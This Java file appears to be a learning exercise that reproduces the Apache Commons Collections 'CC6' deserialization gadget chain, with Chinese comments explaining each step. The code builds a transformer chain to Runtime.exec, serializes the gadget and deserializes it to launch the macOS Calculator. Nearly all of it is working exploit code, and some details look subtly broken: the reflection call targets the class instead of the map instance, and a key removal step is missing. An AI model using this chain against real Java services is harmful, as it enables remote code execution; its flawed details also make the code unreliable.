package commensCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC6_Test {
    public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
////        InvokerTransformer invokerTransformer = new InvokerTransformer(
////                "exec",
////                new Class[]{String.class},
////                new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"});
//
////        Object o = new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
//
////        换链子
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"})
//        };
//
////        换chainedTransformer
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止反序列化之前弹计算器
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
//
//        HashMap<Object, Object> expMap = new HashMap<>();
//        expMap.put(tiedMapEntry, "value");
//
////        put之后通过反射修改值, 防止序列化的时候就弹计算器
//
///*
//与 URLDNS 中的不同，有些链子可以通过设置参数修改，有些则不行。
//在我们 CC6 的链子当中，通过修改这一句语句 Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);可以达到我们需要的效果。
//
//我们之前传进去的参数是 chainedTransformer，我们在序列化的时候传进去一个没用的东西，再在反序列化的时候通过反射，将其修改回 chainedTransformer。
//相关的属性值在 LazyMap 当中为 factory
//*/
//        Class<LazyMap> lazyMapClass = LazyMap.class;
//        Field lazyMapClassDeclaredField = lazyMapClass.getDeclaredField("factory");
//        lazyMapClassDeclaredField.setAccessible(true);
//        lazyMapClassDeclaredField.set(lazyMapClass, chainedTransformer);
//
//
//        serialize(expMap);
//        deserialize("ser.bin");
//
////        tiedMapEntry.getValue();
//
////        lazyMap的前半条链子的EXP
////        HashMap<Object, Object> hashMap = new HashMap<>();
////        Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer);
////
////        Class<LazyMap> lazyMapClass = LazyMap.class;
////        Method lazyGetMethod = lazyMapClass.getDeclaredMethod("get", Object.class);
////        lazyGetMethod.setAccessible(true);
////        lazyGetMethod.invoke(decorateMap, r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> hashMap = new HashMap<>();
//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap<Object, Object> expMap = new HashMap<>();
        expMap.put(tiedMapEntry, "value");

        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factoryField = lazyMapClass.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMapClass, chainedTransformer);

        serialize(expMap);
        deserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object deserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
